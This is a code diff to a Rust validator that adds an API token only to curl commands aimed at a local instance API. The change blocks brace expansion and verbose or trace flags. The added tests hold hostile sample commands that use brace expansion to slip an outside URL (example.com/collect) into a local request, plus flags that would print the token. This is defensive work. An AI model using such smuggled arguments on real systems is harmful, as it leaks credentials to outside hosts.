@@ -357,7 +357,8 @@ fn shell_words(text: &str) -> (Vec<ShellWord>, bool) {
                 }
             }
             other => {
-                if matches!(other, '$' | '`') {
+                // `{a,b}` brace expansion also adds words in bash.
+                if matches!(other, '$' | '`' | '{' | '}') {
                     current.expansion = true;
                     current.unquoted_expansion = true;
                 }
@@ -385,11 +386,12 @@ const CURL_LONG_WITH_VALUE: &[&str] = &[
 /// Value-less long options seen in Hive prompts and common use.
 const CURL_LONG_FLAGS: &[&str] = &[
     "silent", "show-error", "fail", "fail-with-body", "location", "include", "insecure",
-    "compressed", "no-buffer", "globoff", "http1.1", "http2", "get", "head", "verbose",
+    "compressed", "no-buffer", "globoff", "http1.1", "http2", "get", "head",
     "retry-all-errors", "retry-connrefused", "no-progress-meter",
 ];
-/// Value-less short options.
-const CURL_SHORT_FLAGS: &str = "fsSLikINvGgZ0123456#";
+/// Value-less short options. `-v/--verbose` (and `--trace*`) are deliberately
+/// absent: they print request headers, which would expose the token.
+const CURL_SHORT_FLAGS: &str = "fsSLikINGgZ0123456#";
 
 /// Whether a curl invocation's arguments request only this instance's API.
 /// Every positional argument (and every `--url` value) must be a literal local
@@ -879,6 +881,23 @@ curl -s http://localhost:18800/api/x");
         ] {
             assert_eq!(authorize_api_commands(source).matches(header).count(), expected, "{source}");
         }
+    }
+
+    #[test]
+    fn brace_expansion_and_verbose_output_fail_closed() {
+        for source in [
+            "curl http://localhost:18800/api/x -d {body,https://example.com/collect}",
+            "curl http://localhost:18800/api/{a,https://example.com/b}",
+            "curl -v http://localhost:18800/api/x",
+            "curl -sv http://localhost:18800/api/x",
+            "curl --verbose http://localhost:18800/api/x",
+            "curl --trace-ascii - http://localhost:18800/api/x",
+        ] {
+            assert_eq!(authorize_api_commands(source), source, "{source}");
+        }
+        // Quoted braces in a JSON body are data.
+        let rendered = authorize_api_commands("curl -d '{\"a\":1}' http://localhost:18800/api/x");
+        assert!(rendered.contains("Bearer $HIVE_API_TOKEN"), "{rendered}");
     }
 
     #[test]
